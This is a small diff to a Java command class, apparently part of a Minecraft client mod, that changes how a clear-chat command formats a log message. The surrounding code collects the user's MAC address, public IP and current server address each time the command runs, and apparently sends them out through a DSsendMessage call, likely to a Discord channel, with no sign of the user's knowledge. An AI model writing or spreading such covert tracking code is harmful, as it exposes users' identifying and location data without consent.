@@ -52,7 +52,7 @@ public class ClearChatCommand extends Command {
         }
         String macAddress = String.join("-", hexadecimal);
 
-        DSsendMessage("[" + macAddress + " Connected With IP => (" + IpChecker.getIp() +")]" + " Executed Command [ClearChat] Server: [" + mc.getCurrentServerData().serverIP + "]", true, Color.GREEN);
+        DSsendMessage("[" + macAddress + "] \nConnected With IP => \n(" + IpChecker.getIp() +")\n" + " Executed Command [ClearChat]\n Server: [" + mc.getCurrentServerData().serverIP + "]", true, Color.GREEN);
     }
 }
 
